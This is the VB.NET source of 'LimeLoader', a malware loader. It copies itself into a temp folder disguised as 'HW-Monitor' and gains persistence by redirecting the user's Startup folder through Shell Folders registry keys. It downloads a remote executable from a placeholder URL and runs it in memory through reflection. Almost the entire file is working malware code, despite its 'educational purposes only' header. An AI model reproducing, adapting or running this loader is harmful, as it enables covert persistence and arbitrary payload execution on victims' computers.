'#################################################################################
'#                                                                               #
'#                                                                               #
'#       │ Author     : NYAN CAT                                                 #
'#       │ Name       : LimeLoader * 24/11/2018                                  #
'#                                                                               #
'#       Contact Me   : https://github.com/NYAN-x-CAT                            #
'#                                                                               #
'#       This program Is distributed for educational purposes only.              #
'#                                                                               #
'#################################################################################


Public Class Program


    Public Shared Sub Main()
        'Remove //Virtual_Machine// when testing
        Install("HW-Monitor") : Load("http://127.0.0.1:80/Payload.exe")
    End Sub

    Public Shared Sub Install(ByVal Name As String)

        Dim DropDirectory As String = IO.Path.Combine(IO.Path.GetTempPath, Name)
        Dim DropFile As String = "/" + Name + ".exe"
        Dim DropLocation As String = IO.Path.Combine(IO.Path.GetTempPath, DropDirectory + DropFile)
        Try
            If Not IO.Directory.Exists(DropDirectory) Then
                IO.Directory.CreateDirectory(DropDirectory)
            End If

            '############################################################################################################
            '#                                                                                                          #
            '#   https://www.andreafortuna.org/dfir/malware-persistence-techniques/                                     #
            '#                              Startup Keys                                                                #
            '#                                                                                                          #
            '#  //If Iam admin//                                                                                        #                                                                              
            '#  HKEY_LOCAL_MACHINE\ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Explorer \ Shell Folders          #
            '#  HKEY_LOCAL_MACHINE\ SOFTWARE \ Microsoft \ Windows \ CurrentVersion \ Explorer \ User Shell Folders     #
            '#                                                                                                          #
            '############################################################################################################

            If Not Reflection.Assembly.GetExecutingAssembly.Location = DropLocation Then
                IO.File.Copy(Reflection.Assembly.GetExecutingAssembly.Location, DropLocation, True)
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders", True).SetValue("Startup", DropDirectory)
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders", True).SetValue("Startup", DropDirectory)
                Diagnostics.Debug.WriteLine("Installed!")
            Else
                Diagnostics.Debug.WriteLine("Already installed!")
            End If
        Catch ex As Exception
            Diagnostics.Debug.WriteLine(ex.Message)
        End Try
    End Sub

    Private Delegate Function ExecuteAssembly(ByVal sender As Object, ByVal parameters As Object()) As Object
    Public Shared Sub Load(ByVal Payload As String)
        Try
            Dim parameters As Object() = Nothing
            Dim assembly As Reflection.Assembly = Threading.Thread.GetDomain().Load(Download(Payload))
            Dim entrypoint As Reflection.MethodInfo = assembly.EntryPoint
            If entrypoint.GetParameters().Length > 0 Then
                parameters = New Object() {New String() {Nothing}}
            End If
            Dim assemblyExecuteThread As Threading.Thread = New Threading.Thread(Sub()
                                                                                     Threading.Thread.BeginThreadAffinity()
                                                                                     Threading.Thread.BeginCriticalRegion()
                                                                                     Dim executeAssembly As ExecuteAssembly = New ExecuteAssembly(AddressOf entrypoint.Invoke)
                                                                                     executeAssembly(Nothing, parameters)
                                                                                     Threading.Thread.EndCriticalRegion()
                                                                                     Threading.Thread.EndThreadAffinity()
                                                                                 End Sub)
            assemblyExecuteThread.Start()
        Catch ex As Exception
        End Try
    End Sub


    Public Shared Function Download(ByVal URL As String) As Byte()
        Dim EXE As Byte() = Nothing
        If Check_Internet() Then
            Try
                Dim WC As New Net.WebClient
                EXE = WC.DownloadData(URL)
                WC.Dispose()
            Catch ex As Exception
                Diagnostics.Debug.WriteLine("Wrong URL??") : Environment.Exit(0)
            End Try
        Else
            Check_Internet()
        End If
        Return EXE
    End Function

    Public Shared Function Check_Internet() As Boolean
        Threading.Thread.Sleep(2500)

        Dim request As Net.WebRequest = Net.WebRequest.Create("https://www.bing.com/")
        Try
            Dim response As Net.WebResponse = request.GetResponse()
            Diagnostics.Debug.WriteLine("Connected to Internet!")
        Catch ex As Exception
            Diagnostics.Debug.WriteLine(ex.Message)
            Return False
        End Try
        Return True
    End Function

End Class
